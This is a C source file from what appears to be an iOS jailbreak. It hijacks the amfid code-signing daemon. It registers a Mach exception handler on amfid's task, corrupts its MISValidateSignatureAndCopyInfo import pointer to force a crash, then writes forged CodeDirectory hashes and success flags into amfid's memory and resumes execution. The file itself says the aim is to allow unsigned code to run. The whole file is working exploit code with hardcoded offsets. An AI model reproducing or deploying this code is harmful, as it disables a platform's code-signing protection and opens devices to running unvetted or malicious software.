#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <pthread.h>

#include <mach/mach.h>

#include <CoreFoundation/CoreFoundation.h>

#include "kernel_memory_helpers.h"
#include "disable_protections.h"
#include "cdhash.h"

kern_return_t mach_vm_region
(
  vm_map_t target_task,
  mach_vm_address_t *address,
  mach_vm_size_t *size,
  vm_region_flavor_t flavor,
  vm_region_info_t info,
  mach_msg_type_number_t *infoCnt,
  mach_port_t *object_name
);

uint64_t binary_load_address(mach_port_t tp) {
  kern_return_t err;
  mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
  memory_object_name_t object_name = MACH_PORT_NULL; /* unused */
  mach_vm_size_t target_first_size = 0x1000;
  mach_vm_address_t target_first_addr = 0x0;
  struct vm_region_basic_info_64 region = {0};
  printf("about to call mach_vm_region\n");
  err = mach_vm_region(tp,
                       &target_first_addr,
                       &target_first_size,
                       VM_REGION_BASIC_INFO_64,
                       (vm_region_info_t)&region,
                       &region_count,
                       &object_name);

  if (err != KERN_SUCCESS) {
    printf("failed to get the region\n");
    return 0;
  }
  printf("got base address\n");
  
  return target_first_addr;
}

uint64_t amfid_MISValidateSignatureAndCopyInfo_import_offset = 0x40b8;
uint64_t amfid_CFDataGetBytes_import_offset = 0x40E8;

uint64_t amfid_MISCopyErrorStringForErrorCode_import_offset = 0x4090;


// dump the buffer as qwords:
void dword_hexdump(void* buf, size_t len){
  uint32_t* words = (uint32_t*)buf;
  size_t n_words = len / sizeof(uint32_t);
  
  for (size_t i = 0; i < n_words; i++){
    printf("+%08lx %08x\n", i*sizeof(uint32_t), words[i]);
  }
}

#pragma pack(4)
typedef struct {
  mach_msg_header_t Head;
  mach_msg_body_t msgh_body;
  mach_msg_port_descriptor_t thread;
  mach_msg_port_descriptor_t task;
  NDR_record_t NDR;
} exception_raise_request; // the bits we need at least

typedef struct {
  mach_msg_header_t Head;
  NDR_record_t NDR;
  kern_return_t RetCode;
} exception_raise_reply;
#pragma pack()


uint64_t amfid_base = 0;
mach_port_t amfid_exception_port = MACH_PORT_NULL;

void* amfid_exception_handler(void* arg){
  uint32_t size = 0x1000;
  mach_msg_header_t* msg = malloc(size);
  for(;;){
    kern_return_t err;
    printf("calling mach_msg to receive exception message from amfid\n");
    err = mach_msg(msg,
                   MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, // no timeout
                   0,
                   size,
                   amfid_exception_port,
                   0,
                   0);
    if (err != KERN_SUCCESS){
      printf("error receiving on exception port: %s\n", mach_error_string(err));
    } else {
      printf("got exception message from amfid!\n");
      //dword_hexdump(msg, msg->msgh_size);

      exception_raise_request* req = (exception_raise_request*)msg;
      
      mach_port_t thread_port = req->thread.name;
      mach_port_t task_port = req->task.name;
      _STRUCT_ARM_THREAD_STATE64 old_state = {0};
      mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
      err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
      if (err != KERN_SUCCESS){
        printf("error getting thread state: %s\n", mach_error_string(err));
        continue;
      }
      
      printf("got thread state\n");
      //dword_hexdump((void*)&old_state, sizeof(old_state));
      
      _STRUCT_ARM_THREAD_STATE64 new_state;
      memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));

      // get the filename pointed to by X25
      char* filename = rmem(task_port, new_state.__x[25], 1024);
      printf("got filename for amfid request: %s\n", filename);
      
      // parse that macho file and do a SHA1 hash of the CodeDirectory
      uint8_t cdhash[AMFID_HASH_SIZE];
      get_hash_for_amfid(filename, cdhash);
      
      free(filename);
 
      // x24 points into the out message where we should write the correct cd hash
      for (int i = 0; i < sizeof(cdhash); i++){
        w8(task_port, old_state.__x[24] + i, cdhash[i]);
      }
      
      printf("wrote the cdhash into amfid\n");
      
      // also need to write a 1 to [x20]
      w32(task_port, old_state.__x[20], 1);
      
      new_state.__pc = amfid_base + 0x2F04; // where to continue
      
      // set the new thread state:
      err = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&new_state, sizeof(new_state)/4);
      if (err != KERN_SUCCESS) {
        printf("failed to set new thread state %s\n", mach_error_string(err));
      } else {
        printf("set new state for amfid!\n");
      }
      
      exception_raise_reply reply = {0};
      
      reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
      reply.Head.msgh_size = sizeof(reply);
      reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
      reply.Head.msgh_local_port = MACH_PORT_NULL;
      reply.Head.msgh_id = req->Head.msgh_id + 100;
      
      reply.NDR = req->NDR;
      reply.RetCode = KERN_SUCCESS;
      
      err = mach_msg(&reply.Head,
                     MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                     (mach_msg_size_t)sizeof(reply),
                     0,
                     MACH_PORT_NULL,
                     MACH_MSG_TIMEOUT_NONE,
                     MACH_PORT_NULL);
      
      mach_port_deallocate(mach_task_self(), thread_port);
      mach_port_deallocate(mach_task_self(), task_port);
      
      if (err != KERN_SUCCESS){
        printf("failed to send the reply to the exception message %s\n", mach_error_string(err));
      } else{
        printf("replied to the amfid exception...\n");
      }
    }
  }
  return NULL;
}


void set_exception_handler(mach_port_t amfid_task_port){
  // allocate a port to receive exceptions on:
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amfid_exception_port);
  mach_port_insert_right(mach_task_self(), amfid_exception_port, amfid_exception_port, MACH_MSG_TYPE_MAKE_SEND);

  kern_return_t err = task_set_exception_ports(amfid_task_port,
                                               EXC_MASK_ALL,
                                               amfid_exception_port,
                                               EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,  // we want to receive a catch_exception_raise message with the thread port for the crashing thread
                                               ARM_THREAD_STATE64);
  
  if (err != KERN_SUCCESS){
    printf("error setting amfid exception port: %s\n", mach_error_string(err));
  } else {
    printf("set amfid exception port\n");
  }
  
  // spin up a thread to handle exceptions:
  pthread_t exception_thread;
  pthread_create(&exception_thread, NULL, amfid_exception_handler, NULL);
}

// patch amfid so it will allow execution of unsigned code without breaking amfid's own code signature
int patch_amfid(mach_port_t amfid_task_port) {
  set_exception_handler(amfid_task_port);
  
  printf("about to search for the binary load address\n");
  amfid_base = binary_load_address(amfid_task_port);
  printf("amfid load address: 0x%llx\n", amfid_base);

  w64(amfid_task_port, amfid_base+amfid_MISValidateSignatureAndCopyInfo_import_offset, 0x4141414141414140); // crashy
  
  return 0;
}
